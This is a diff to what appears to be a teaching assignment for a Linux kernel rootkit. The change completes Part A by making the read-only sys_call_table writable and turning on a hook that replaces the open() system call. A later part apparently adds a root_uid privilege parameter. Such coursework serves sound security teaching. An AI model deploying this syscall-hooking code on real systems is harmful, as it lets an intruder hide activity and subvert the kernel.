@@ -8,10 +8,10 @@
 /*
  * The sys_call_table is an array of void pointers.
  *
- * Since Linux kernel version 2.6.x the sys_call_table symbol is no longer 
+ * Since Linux kernel version 2.6.x the sys_call_table symbol is no longer
  * exported, meaning we can't use kallsyms to find where it lives in memory
  * instead you'll have to grep "sys_call_table" /boot/System.map-$(uname -r)
- * and hardcode the resulting memory address into your module before compiling
+ * and hardcode the resulting memory address into your module before compiling.
  * Baby steps!
  */
 static void **sys_call_table;
@@ -32,7 +32,7 @@ MODULE_PARM_DESC(table_addr, "Address of sys_call_table in memory");
 
 //******
 //TODO: NEEDED FOR PART B
-//	Accept root_uid as a kernel module parameter 
+//	Accept root_uid as a kernel module parameter
 //	(see module_parm() example above)
 //******
 /*
@@ -105,14 +105,17 @@ int hook_syscall(t_syscall_hook *hook)
   //
   //	make the sys_call_table RW before the hook and RO after
   //
-  //	Since linux-kernel ~2.6.24  the sys_call_table has been in read-only 
-  //	memory. We need to mark it rw ourselves (we're root afterall), replace 
+  //	Since linux-kernel ~2.6.24  the sys_call_table has been in read-only
+  //	memory. We need to mark it rw ourselves, replace
   //	the syscall	function pointer, and then tidy up after ourselves.
   //********
-  
+  set_addr_rw((unsigned long) sys_call_table);
+
   sys_call_table[hook->offset] = hook->hook_func;
 
-  
+  set_addr_ro((unsigned long) sys_call_table);
+
+
   //Remember that we enabled the hook
   hook->hooked = true;
   return hook->hooked;
@@ -135,10 +138,13 @@ int unhook_syscall(t_syscall_hook *hook)
   //TODO: NEEDED FOR PART A
   //	make the sys_call_table RW before the hook and RO after
   //********
+  set_addr_rw((unsigned long) sys_call_table);
 
   sys_call_table[hook->offset] = hook->orig_func;
 
-  
+  set_addr_ro((unsigned long) sys_call_table);
+
+
   //Remember we've undone the hook
   hook->hooked = false;
   return !hook->hooked;
@@ -215,13 +221,15 @@ int init_module(void)
 
   //********
   //TODO: NEEDED FOR PART A
-  //	uncomment the example hook AFTER you have marked the syscall table 
+  //	uncomment the example hook AFTER you have marked the syscall table
   //	memory RW (see notes above).
   //********
+  set_addr_rw((unsigned long) sys_call_table);
 
   //Let's hook open() for an example of how to use the framework
-  //hook_syscall(new_hook(__NR_open, (void*) &new_open));
+  hook_syscall(new_hook(__NR_open, (void*) &new_open));
 
+  set_addr_ro((unsigned long) sys_call_table);
 
 
   //********
@@ -300,4 +308,3 @@ asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
   //	You will want to add function prototypes to rootkit.h
   //	Make sure they match the original function definitions.
   //********
-
